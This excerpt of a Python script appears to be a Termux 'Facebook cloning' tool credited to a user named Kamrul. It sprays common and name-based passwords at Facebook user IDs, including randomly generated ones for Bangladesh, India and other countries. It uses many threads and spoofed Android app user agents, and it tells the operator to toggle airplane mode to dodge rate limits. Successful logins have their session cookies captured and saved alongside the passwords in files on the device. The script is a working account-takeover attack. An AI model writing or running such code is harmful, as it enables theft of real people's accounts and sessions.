...
from concurrent.futures import ThreadPoolExecutor as Kamrul
from string import * 
...
sys.stdout.write('\x1b]2; Kamrul\x07')
...
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
\033[1;32m──────────────────────────────────────────────────
\033[1;32m[\033[1;31m✓\033[1;32m] AUTHOR    : KAMRUL
\033[1;32m[\033[1;31m✓\033[1;32m] GITHUB    : https://github.com/ARIYAN5050
\033[1;32m[\033[1;31m✓\033[1;32m] FACEBOOK  : KAMRUL ISLAM
...
def menu():   
    ...
    print(f'\033[1;32m[\033[1;31m2\033[1;32m] RANDOM FREE FIRE CLONING')
    ...
    if select =='1':
        ...
        os.system('xdg-open https://wa.me/+8801887554473');menu()
    elif select =='5':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100089854232814');menu()
    elif select =='6':
        os.system('xdg-open https://100089854232814');menu()
    elif select =='0':
...
def _old_():
       ...
       with Kamrul(max_workers=40) as Kamrul:
           clear()
...
def login(uid):
    ...
    try:
        sys.stdout.write(f"\r\033[1;32m[\033[1;31mKamrul-XD\033[1;32m] \033[1;35m{loop}\033[1;35m \033[1;32m|\033[1;32m OK{G}/{R}CP \033[1;32m|\033[1;32m {G}{len(ok)}/{R}{len(cp)} ")
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
            ...
            if "session_key" in rp:
                print(f"\r{R}[{R}Kamrul-CP{R}]{R} {uid} | {pw}")
                open("/sdcard/Kamrul.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:          
            	print(f"\r{R}[{G1}Kamrul-OK{R}]{G1} {uid} | {pw}")
            	open("/sdcard/Kamrul-cp.txt","a").write(uid+"|"+pw+"\n")
            	oks.append(uid)
            	break
            elif "Please Confirm Email" in str(rp):            
            	print(f"\r{R}[{G1}Kamrul-OK{R}]{G1} {uid} | {pw}")
            	open("/sdcard/Kamrul-ok.txt","a").write(uid+"|"+pw+"\n")
            	oks.append(uid)
            	break
            else:continue
        loop+=1
...
def _randm_():   
    clear()
    print(f'\033[1;32m[\033[1;31m1\033[1;32m] BANGLADESH FF CLONING')
    print(f'\033[1;32m[\033[1;31m2\033[1;32m] NEPAL FF CLONING')
    print(f'\033[1;32m[\033[1;31m3\033[1;32m] INDIAN FF CLONING')
    print(f'\033[1;32m[\033[1;31m4\033[1;32m] PAKISTAN FF CLONING')
    print(f'\033[1;32m[\033[1;31m5\033[1;32m] MALAYSIA FF CLONING')
    print(f'\033[1;32m[\033[1;31m6\033[1;32m] AFGHANISTAN FF CLONING')
...
def _bd_():
    ...
    for x in range(limit):
        ...
        user.append(nmp)
    clear()
    with Kamrul(max_workers=30) as sexy:
        clear()
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G1} /sdcard/Kamrul.txt');linex()
    ...
    def pasw(self):       
            ...
            print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TURN {G3}[{R}ON{G}/{R}OFF{G3}]{G3} AIRPLANE MODE EVERY {R}5{G3} MIN')
            linex()
            with Kamrul(max_workers=30) as Kamrulworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                Kamrulworld.submit(self.methodA,uid,name,pwx)
                            elif 'methodB' in methods:
                                Kamrulworld.submit(self.methodB,uid,name, pwx)
                            elif 'methodC' in methods:
                                Kamrulworld.submit(self.methodC,uid,name, pwx)
                   except:pass
            result(oks,cps)          
#__________________[ FILE METHOD M1 ]__________________#             
    def methodA(self,sid,name,psw):
        try:
            ...
            sys.stdout.write(f"\r\033[1;32m[\033[1;31mKamrul-M1\033[1;32m] \033[1;36m{loop}\033[1;35m \033[1;34m|\033[1;32m OK\033[1;34m|\033[1;31mCP \033[1;32m{len(oks)}\033[1;34m|\033[1;31m{len(cps)} \033[1;34m| \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Kamrulb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Kamrulb};{ckkk}"
                    print(f"\r\r{G1}[Kamrul-OK] {sid} | {ps} ")
                    print(f"\r\r{G1}[COOKIES-💜]>{O}{cookie} ")
                    open('/sdcard/Kamrul-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[Kamrul-CP] {sid} | {ps} ")
                    open('/sdcard/Kamrul-M1-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self,sid,name,psw):
        try:
            ...
            sys.stdout.write(f"\r\033[1;32m[\033[1;31mKamrul-M2\033[1;32m] \033[1;36m{loop}\033[1;35m \033[1;34m|\033[1;32m OK\033[1;34m|\033[1;31mCP \033[1;32m{len(oks)}\033[1;34m|\033[1;31m{len(cps)} \033[1;34m| \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{G1}[Kamrul-OK] {sid} | {ps} ")
                    print(f"\r\r{G1}[COOKIES-💜]>{O}{cookie} ")
                    open('/sdcard/Kamrul-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[Kamrul-CP] {sid} | {ps} ")
                    open('/sdcard/Kamrul-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
    ...
    def methodC(self,sid,name,psw):
        try:
            ...
            mcc = random.choice(['SM-F711B', 'SM-F711N', 'SM-F711U', 'SM-F711U1', 'SM-E025F', 'SM-T575', 'SM-A516V', 'SM-M017F', 'SM-J260GU', 'SM-J260GU', 'SM-J260FU', 'SM-J260MU', 'SM-A716F', 'SM-A716F', 'SM-A716F', 'SM-A7160', 'SM-A716B', 'SM-A716U', 'SM-A716B', 'SM-M115F', 'SM-M115F', 'SM-M115M', 'SM-M115M', 'SM-G988', 'SM-G988U', 'SM-G988U1', 'SM-G9880', 'SM-G988B', 'SM-G988N', 'SM-G988B', 'SM-T927A', 'SM-T920', 'SM-A305F', 'SM-A305FN', 'SM-A305G', 'SM-A305GN', 'SM-A305YN', 'SM-A3050', 'SM-A305N', 'SM-A305GT', 'SM-A105F', 'SM-A105G', 'SM-A105M', 'SM-A105FN', 'SM-A920F', 'SM-A9200', 'SM-A920N', 'SM-A920X', 'SM-N960F', 'SM-N9600', 'SM-N960F', 'SM-N960U', 'SM-N960U1', 'SM-N960N', 'SM-N960W', 'SM-N960X', 'SCV40'])
            uai = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(40,200))+'.0.0.'+str(random.randint(1,66))+'.117;FBBV/308613358;FBDM/{density=2.0,width=720,height=1440};FBLC/it_IT;FBRV/'+str(random.randint(111111111,666666666))+';FBCR/Airalo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+str(mcc)+';FBSV/7.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            sys.stdout.write(f"\r\033[1;32m[\033[1;31mKamrul-M3\033[1;32m] \033[1;36m{loop}\033[1;35m \033[1;34m|\033[1;32m OK\033[1;34m|\033[1;31mCP \033[1;32m{len(oks)}\033[1;34m|\033[1;31m{len(cps)} \033[1;34m| \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{G1}[Kamrul-OK] {sid} | {ps} ")
                    print(f"\r\r{G1}[COOKIES-💜]>{O}{cookie} ")
                    open('/sdcard/Kamrul-M3-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[Kamrul-CP] {sid} | {ps} ")
                    open('/sdcard/Kamrul-M3-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
...
def randm(ids,psd):
    ...
    sys.stdout.write(f"\r\033[1;32m[\033[1;31mKamrul-RNDM\033[1;32m] \033[1;35m{loop}\033[1;35m \033[1;32m|\033[1;32m OK{G}/{R}CP \033[1;32m|\033[1;32m {G}{len(ok)}/{R}{len(cp)} ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            ...
            if 'access_token' in q:
                uid = str(q['uid'])
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Kamrulb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Kamrulb};{ckkk}"
                print(f'\r\r{G1}[Kamrul-OK] {uid} | {pas}')
                print(f'\r\r{G1}[COOKIE]{R} {cookie}')
                open('/sdcard/Kamrul-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                ok.append(uid)
                break
            elif 'www.facebook.com' in q['error']['message']:
                print(f"\r\r{M}[Kamrul-CP] {uid} | {pas} ")
                open('/sdcard/Kamrul-RNDM-CP.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                cps.append(uid)
            else:     
                continue
        loop+=1
